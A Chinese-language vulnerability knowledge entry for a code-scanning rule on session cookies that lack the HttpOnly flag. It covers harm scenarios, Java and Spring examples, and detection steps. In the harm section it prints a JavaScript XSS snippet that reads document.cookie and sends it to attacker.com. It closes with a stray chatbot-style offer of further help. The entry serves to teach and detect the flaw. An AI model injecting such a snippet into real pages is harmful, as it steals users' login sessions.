# 身份凭据Cookie未设置HttpOnly漏洞 问题描述

> 规则 ID：`cookie_response_cookiesecure` · 类别：cookie · 关键 sink：addCookie, setCookie
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## 身份凭据Cookie未设置HttpOnly漏洞 问题描述
## 一、漏洞定义
当承载身份凭据（如Session ID、JWT Token、认证令牌等）的Cookie未配置`HttpOnly`属性时，存在**身份凭据Cookie未设置HttpOnly**漏洞。
`HttpOnly`是Cookie的核心安全属性，作用是**禁止客户端脚本（如JavaScript）通过`document.cookie`访问该Cookie**，仅允许HTTP/HTTPS请求在浏览器与服务器之间传输。

## 二、漏洞触发的核心条件
1.  Cookie存储的是**身份认证相关数据**（如JSESSIONID、token、sso_token等），属于用户核心身份凭据。
2.  服务端在响应头`Set-Cookie`中未显式添加`HttpOnly`标识，示例如下：
    - 存在漏洞的响应头：`Set-Cookie: JSESSIONID=abc123; Path=/; Secure`
    - 安全的响应头：`Set-Cookie: JSESSIONID=abc123; Path=/; Secure; HttpOnly`

## 三、漏洞危害场景
### 1. 跨站脚本攻击（XSS）导致身份凭据窃取
这是该漏洞最直接、最严重的危害。当目标网站存在XSS漏洞时，攻击者可注入恶意脚本，窃取未设置`HttpOnly`的身份Cookie，进而冒充合法用户身份。
**攻击流程**：
1.  攻击者在存在XSS漏洞的页面（如评论区、搜索框）注入恶意JS代码：
    ```javascript
    // 窃取Cookie并发送到攻击者服务器
    var cookie = document.cookie;
    new Image().src = "http://attacker.com/steal?cookie=" + encodeURIComponent(cookie);
    ```
2.  合法用户访问该页面，恶意脚本在用户浏览器中执行，读取身份Cookie。
3.  Cookie数据被发送到攻击者的服务器，攻击者使用该Cookie发起请求，即可**完全冒充用户身份**，进行越权操作（如查看个人信息、转账、修改密码等）。

### 2. 存储型XSS的持久化攻击风险
若XSS漏洞为**存储型**（恶意脚本被持久化存储在服务器，如数据库），则所有访问该页面的用户都会触发攻击，导致大规模的Cookie窃取，危害范围呈指数级扩大。

### 3. 反射型XSS的钓鱼攻击配合
攻击者可构造包含XSS恶意代码的钓鱼链接，诱导用户点击。用户点击后，浏览器执行脚本并窃取Cookie，无需用户进行额外操作，攻击隐蔽性极强。

### 4. 与其他漏洞叠加放大危害
该漏洞与以下漏洞叠加时，危害会进一步升级：
- **未设置Secure属性**：Cookie可通过HTTP明文传输，攻击者可通过网络嗅探（如ARP欺骗）获取Cookie，结合`HttpOnly`缺失，双重风险叠加。
- **Cookie作用域过宽（Path=/; Domain=.xxx.com）**：窃取的Cookie可在整个主域名下的子域名生效，扩大攻击覆盖范围。
- **会话超时时间过长**：窃取的Cookie有效期越长，攻击者冒充用户的时间窗口就越大。

## 四、不同场景下的漏洞表现
### 1. Java Web应用场景
- **基于Servlet/JSP的应用**：默认情况下，`JSESSIONID` Cookie **不会自动设置`HttpOnly`**（需手动配置）。
  开发者若未在`web.xml`或通过`HttpServletResponse`设置，就会触发漏洞：
  ```java
  // 存在漏洞的写法：未设置HttpOnly
  response.addCookie(new Cookie("JSESSIONID", session.getId()));

  // 正确写法（后续修复用，此处仅说明对比）
  Cookie cookie = new Cookie("JSESSIONID", session.getId());
  cookie.setHttpOnly(true); // 关键配置
  response.addCookie(cookie);
  ```
- **基于Spring Boot的应用**：若未在`application.properties/yaml`中配置`server.servlet.session.cookie.http-only=true`，则`JSESSIONID` Cookie默认无`HttpOnly`属性。

### 2. 前后端分离应用场景
- 后端通过`Set-Cookie`返回身份令牌（如JWT Token存储在Cookie中），但未添加`HttpOnly`。
- 前端若存在XSS漏洞，攻击者可通过脚本窃取Cookie中的Token，直接用于调用后端API接口，实现越权访问。

### 3. 第三方认证集成场景
- 集成OAuth2.0、SSO单点登录的应用，若认证服务器返回的身份Cookie未设置`HttpOnly`，则攻击者可通过子系统的XSS漏洞窃取Cookie，进而绕过单点登录验证，访问所有关联系统。

### 4. 移动应用内嵌WebView场景
- 移动App内嵌的WebView若加载存在XSS漏洞的页面，且身份Cookie未设置`HttpOnly`，恶意脚本可窃取Cookie，进而突破App的沙箱隔离，获取用户在App内的认证状态。

## 五、漏洞检测方法
### 1. 浏览器开发者工具检测
1.  打开目标网站，登录后按`F12`进入**开发者工具** → **Application** → **Cookies**。
2.  查看存储身份凭据的Cookie（如JSESSIONID、token），检查`HttpOnly`列是否为`√`：
    - 无`√` → 存在漏洞。
    - 有`√` → 该属性配置正常。

### 2. 抓包工具检测（如Burp Suite、Fiddler）
1.  拦截服务端的`Set-Cookie`响应头，查看是否包含`HttpOnly`关键字：
    - 响应头示例（存在漏洞）：`Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; Path=/; Secure`
    - 响应头示例（安全）：`Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; Path=/; Secure; HttpOnly`

### 3. 脚本验证（验证是否可被JS读取）
在目标网站的控制台（F12 → Console）执行`document.cookie`，若能输出身份凭据Cookie的内容，则说明未设置`HttpOnly`，漏洞存在。

## 六、漏洞影响范围
- **影响的系统类型**：所有使用Cookie存储身份凭据的Web应用、前后端分离应用、移动应用内嵌WebView等。
- **影响的用户群体**：所有访问存在漏洞页面的已登录用户，尤其是管理员、高权限用户。
- **合规性影响**：不符合OWASP Top 10、PCI DSS等安全规范（PCI DSS明确要求身份Cookie需设置`HttpOnly`）。

我可以帮你整理**该漏洞在不同Java框架中的检测用例**，方便你直接集成到漏洞扫描脚本中，需要吗？


